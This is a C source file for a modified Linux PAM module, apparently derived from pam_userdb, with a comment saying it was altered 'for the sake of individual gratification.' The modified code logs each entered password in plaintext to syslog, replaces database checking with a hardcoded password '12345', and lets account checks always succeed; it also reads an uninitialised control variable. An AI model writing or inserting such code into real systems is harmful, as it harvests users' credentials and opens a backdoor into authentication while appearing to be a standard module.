/* pam_userdb module */

/*
 * Written by Cristian Gafton <gafton@redhat.com> 1996/09/10
 * See the end of the file for Copyright Information
 */

/*
 * Modified by Flaz14 <flazfourteen@gmail.com> 2016/07/02
 * for the sake of individual gratification.
 */

#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <syslog.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#ifdef HAVE_LIBXCRYPT
#include <xcrypt.h>
#elif defined(HAVE_CRYPT_H)
#include <crypt.h>
#endif

#include "pam_userdb.h"

/*
 * here, we make a definition for the externally accessible function
 * in this file (this definition is required for static a module
 * but strongly encouraged generally) it is used to instruct the
 * modules include file to define the function prototypes.
 */
#define PAM_SM_AUTH
#define PAM_SM_ACCOUNT

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/_pam_macros.h>


/*
 * Conversation function to obtain the user's password
 */
static int
obtain_authtok (pam_handle_t * pamh)
{
  char *resp;
  const void *item;
  int retval;

  retval = pam_prompt (pamh, PAM_PROMPT_ECHO_OFF, &resp, _("Password: "));
  
  pam_syslog (pamh, LOG_INFO, ">>> obtain_authtok() password: %s ", resp);

  if (retval != PAM_SUCCESS)
    return retval;

  if (resp == NULL)
    return PAM_CONV_ERR;

  /* set the auth token */
  retval = pam_set_item (pamh, PAM_AUTHTOK, resp);

  /* clean it up */
  _pam_overwrite (resp);
  _pam_drop (resp);

  if ((retval != PAM_SUCCESS) ||
      (retval = pam_get_item (pamh, PAM_AUTHTOK, &item)) != PAM_SUCCESS)
    {
      return retval;
    }

  return retval;
}



/* --- authentication management functions (only) --- */

PAM_EXTERN int
pam_sm_authenticate (pam_handle_t * pamh, int flags UNUSED,
		     int argc, const char **argv)
{
  const char *username;
  const void *password;
  const char *database = NULL;
  const char *cryptmode = NULL;
  int retval = PAM_AUTH_ERR, ctrl;

  /* Get the username */
  retval = pam_get_user (pamh, &username, NULL);
  if ((retval != PAM_SUCCESS) || (!username))
    {
      pam_syslog (pamh, LOG_ERR, "can not get the username");
      return PAM_SERVICE_ERR;
    }

  if ((ctrl & PAM_USE_FPASS_ARG) == 0 && (ctrl & PAM_TRY_FPASS_ARG) == 0)
    {
      /* Converse to obtain a password */
      retval = obtain_authtok (pamh);
      if (retval != PAM_SUCCESS)
	{
	  pam_syslog (pamh, LOG_ERR, "can not obtain password from user");
	  return retval;
	}
    }

  /* Check if we got a password */
  retval = pam_get_item (pamh, PAM_AUTHTOK, &password);
  if (retval != PAM_SUCCESS || password == NULL)
    {
      if ((ctrl & PAM_TRY_FPASS_ARG) != 0)
	{
	  /* Converse to obtain a password */
	  retval = obtain_authtok (pamh);
	  if (retval != PAM_SUCCESS)
	    {
	      pam_syslog (pamh, LOG_ERR, "can not obtain password from user");
	      return retval;
	    }
	  retval = pam_get_item (pamh, PAM_AUTHTOK, &password);
	}
      if (retval != PAM_SUCCESS || password == NULL)
	{
	  pam_syslog (pamh, LOG_ERR, "can not recover user password");
	  return PAM_AUTHTOK_RECOVERY_ERR;
	}
    }

  if (ctrl & PAM_DEBUG_ARG)
    pam_syslog (pamh, LOG_INFO, "Verify user `%s' with a password", username);

  char* temp = (char*)password;
  
  pam_syslog (pamh, LOG_INFO, ">>> pam_sm_authenticate() password: %s ", temp);
  
 	if ( strcmp("12345", temp) == 0) {
 	  return PAM_SUCCESS;
 	}
	
	return PAM_AUTH_ERR;
  

}


/*
 * Stubs for other PAM functions.
 */
PAM_EXTERN int
pam_sm_setcred (pam_handle_t * pamh UNUSED, int flags UNUSED,
		int argc UNUSED, const char **argv UNUSED)
{
  return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_acct_mgmt (pam_handle_t * pamh, int flags UNUSED,
		  int argc, const char **argv)
{ 
  return PAM_SUCCESS;
}


/*
 * Copyright (c) Cristian Gafton <gafton@redhat.com>, 1999
 *                                              All rights reserved
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, and the entire permission notice in its entirety,
 *    including the disclaimer of warranties.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior
 *    written permission.
 *
 * ALTERNATIVELY, this product may be distributed under the terms of
 * the GNU Public License, in which case the provisions of the GPL are
 * required INSTEAD OF the above restrictions.  (This clause is
 * necessary due to a potential bad interaction between the GPL and
 * the restrictions contained in a BSD-style copyright.)
 *
 * THIS SOFTWARE IS PROVIDED `AS IS'' AND ANY EXPRESS OR IMPLIED
 * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */
